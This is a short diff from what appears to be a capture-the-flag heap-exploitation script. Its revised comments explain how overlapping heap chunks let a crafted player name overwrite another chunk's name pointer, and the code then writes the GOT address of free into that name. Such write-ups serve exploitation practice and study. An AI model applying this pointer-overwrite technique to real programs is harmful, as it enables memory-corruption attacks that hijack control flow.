@@ -85,8 +85,10 @@ if __name__ == "__main__":
     # typedef _player_st { _DWORD attack, defense, speed, precision; char * name } player_st;
     # -> malloc(sizeof(player_st)) -> 24 bytes from LIFO fastbin (previous chunk C-1)
     # -> malloc("EEEE....EEEE" + "\x18\x30\x60") -> 16+3+1 bytes from unsorted bin (previous chunk A-1)
-    # so, 'selected' overlaps with "E"'s name ptr and
-    # future set_name() will reference 'selected+16' which is 0x603018
+    # so, 'selected' overlaps with chunk E-2 (player name "EEEEE....")
+    # so, (removed) chunk A-1 overlaps with chunk E-2.
+    # so, a carefully crafted name of chunk E will overwrite chunk A-1's name_ptr
+    # and future set_name() will reference the overwritten pointer.
 
     add('E'*16 + p64(b.got['free']), 0xfe)
     raw_input('after adding E...')
